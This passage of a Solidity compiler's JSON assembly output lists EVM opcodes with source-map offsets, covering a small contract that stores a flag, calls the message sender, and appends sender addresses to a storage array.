											"end": 567,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 342,
											"end": 504,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 342,
											"end": 504,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 402,
											"end": 407,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 395,
											"end": 399,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 395,
											"end": 399,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 395,
											"end": 407,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 395,
											"end": 407,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 395,
											"end": 407,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 395,
											"end": 407,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 395,
											"end": 407,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 395,
											"end": 407,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 395,
											"end": 407,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 395,
											"end": 407,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 395,
											"end": 407,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 395,
											"end": 407,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 395,
											"end": 407,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 395,
											"end": 407,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 395,
											"end": 407,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 395,
											"end": 407,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 395,
											"end": 407,
											"name": "OR",
											"source": 0
										},
										{
											"begin": 395,
											"end": 407,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 395,
											"end": 407,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 395,
											"end": 407,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 420,
											"end": 430,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 420,
											"end": 435,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 420,
											"end": 435,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 420,
											"end": 439,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 420,
											"end": 439,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 420,
											"end": 439,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 420,
											"end": 439,
											"name": "tag",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 420,
											"end": 439,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 420,
											"end": 439,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 420,
											"end": 439,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 420,
											"end": 439,
											"name": "DUP7",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 420,
											"end": 439,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 420,
											"end": 439,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 420,
											"end": 439,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 420,
											"end": 439,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "PUSH",
											"source": 0,
											"value": "3F"
										},
										{
											"begin": 420,
											"end": 439,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 420,
											"end": 439,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 420,
											"end": 439,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 420,
											"end": 439,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 420,
											"end": 439,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "tag",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 420,
											"end": 439,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 420,
											"end": 439,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 420,
											"end": 439,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 420,
											"end": 439,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 460,
											"end": 464,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 460,
											"end": 464,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 460,
											"end": 464,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 460,
											"end": 464,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 460,
											"end": 464,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 460,
											"end": 464,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 460,
											"end": 464,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 460,
											"end": 464,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 460,
											"end": 464,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 460,
											"end": 464,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 460,
											"end": 464,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 452,
											"end": 465,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 452,
											"end": 465,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 452,
											"end": 465,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 452,
											"end": 465,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 452,
											"end": 465,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 452,
											"end": 465,
											"name": "tag",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 452,
											"end": 465,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 476,
											"end": 483,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 489,
											"end": 495,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 476,
											"end": 496,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 476,
											"end": 496,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 476,
											"end": 496,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 476,
											"end": 496,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 476,
											"end": 496,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 476,
											"end": 496,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 476,
											"end": 496,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 476,
											"end": 496,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 476,
											"end": 496,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "OR",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 476,
											"end": 496,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 342,
											"end": 504,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 342,
											"end": 504,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "tag",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 293,
											"end": 317,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 293,
											"end": 317,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 88,
											"end": 205,
											"name": "tag",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 88,
											"end": 205,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 197,
											"end": 198,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 194,
											"end": 195,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 187,
											"end": 199,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 334,
											"end": 460,
											"name": "tag",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 334,
											"end": 460,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 371,
											"end": 378,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 411,
											"end": 453,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 404,
											"end": 409,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 400,
											"end": 454,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 389,
											"end": 454,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 389,
											"end": 454,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 334,
											"end": 460,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 334,
											"end": 460,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 334,
											"end": 460,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 334,
											"end": 460,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 466,
											"end": 562,
											"name": "tag",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 466,
											"end": 562,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 503,
											"end": 510,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 532,
											"end": 556,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "49"
										},
										{
											"begin": 550,
											"end": 555,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 532,
											"end": 556,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 532,
											"end": 556,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 532,
											"end": 556,
											"name": "tag",
											"source": 1,
											"value": "49"
										},
										{
											"begin": 532,
											"end": 556,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 521,
											"end": 556,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 521,
											"end": 556,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 466,
											"end": 562,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 466,
											"end": 562,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 466,
											"end": 562,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 466,
											"end": 562,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 568,
											"end": 690,
											"name": "tag",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 568,
											"end": 690,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 641,
											"end": 665,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "51"
										},
										{
											"begin": 659,
											"end": 664,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 641,
											"end": 665,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 641,
											"end": 665,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 641,
											"end": 665,
											"name": "tag",
											"source": 1,
											"value": "51"
										},
										{
											"begin": 641,
											"end": 665,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 634,
											"end": 639,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 631,
											"end": 666,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 621,
											"end": 684,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "52"
										},
										{
											"begin": 621,
											"end": 684,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 680,
											"end": 681,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 677,
											"end": 678,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 670,
											"end": 682,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 621,
											"end": 684,
											"name": "tag",
											"source": 1,
											"value": "52"
										},
										{
											"begin": 621,
											"end": 684,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 568,
											"end": 690,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 568,
											"end": 690,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 696,
											"end": 835,
											"name": "tag",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 696,
											"end": 835,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 742,
											"end": 747,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 780,
											"end": 786,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 767,
											"end": 787,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 758,
											"end": 787,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 758,
											"end": 787,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 796,
											"end": 829,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 823,
											"end": 828,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 796,
											"end": 829,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 796,
											"end": 829,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 796,
											"end": 829,
											"name": "tag",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 796,
											"end": 829,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 696,
											"end": 835,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 696,
											"end": 835,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 696,
											"end": 835,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 696,
											"end": 835,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 696,
											"end": 835,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 841,
											"end": 1170,
											"name": "tag",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 841,
											"end": 1170,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 900,
											"end": 906,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 949,
											"end": 951,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 937,
											"end": 946,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 928,
											"end": 935,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 924,
											"end": 947,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 920,
											"end": 952,
											"name": "SLT",
											"source": 1
										},
										{
											"begin": 917,
											"end": 1036,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 917,
											"end": 1036,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "56"
										},
										{
											"begin": 917,
											"end": 1036,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 955,
											"end": 1034,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "57"
										},
										{
											"begin": 955,
											"end": 1034,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 955,
											"end": 1034,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 955,
											"end": 1034,
											"name": "tag",
											"source": 1,
											"value": "57"
										},
										{
											"begin": 955,
											"end": 1034,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 917,
											"end": 1036,
											"name": "tag",
											"source": 1,
											"value": "56"
										},
										{
											"begin": 917,
											"end": 1036,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1075,
											"end": 1076,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1100,
											"end": 1153,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 1145,
											"end": 1152,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1136,
											"end": 1142,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1125,
											"end": 1134,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 1121,
											"end": 1143,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1100,
											"end": 1153,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 1100,
											"end": 1153,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1100,
											"end": 1153,
											"name": "tag",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 1100,
											"end": 1153,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1090,
											"end": 1153,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1090,
											"end": 1153,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1046,
											"end": 1163,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 841,
											"end": 1170,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 841,
											"end": 1170,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 841,
											"end": 1170,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 841,
											"end": 1170,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 841,
											"end": 1170,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1176,
											"end": 1253,
											"name": "tag",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 1176,
											"end": 1253,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1213,
											"end": 1220,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1242,
											"end": 1247,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1231,
											"end": 1247,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1231,
											"end": 1247,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1176,
											"end": 1253,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1176,
											"end": 1253,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1176,
											"end": 1253,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1176,
											"end": 1253,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1259,
											"end": 1381,
											"name": "tag",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 1259,
											"end": 1381,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1332,
											"end": 1356,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "61"
										},
										{
											"begin": 1350,
											"end": 1355,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1332,
											"end": 1356,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 1332,
											"end": 1356,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1332,
											"end": 1356,
											"name": "tag",
											"source": 1,
											"value": "61"
										},
										{
											"begin": 1332,
											"end": 1356,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1325,
											"end": 1330,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1322,
											"end": 1357,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 1312,
											"end": 1375,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "62"
										},
										{
											"begin": 1312,
											"end": 1375,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1371,
											"end": 1372,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1368,
											"end": 1369,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1361,
											"end": 1373,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1312,
											"end": 1375,
											"name": "tag",
											"source": 1,
											"value": "62"
										},
										{
											"begin": 1312,
											"end": 1375,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1259,
											"end": 1381,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1259,
											"end": 1381,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1387,
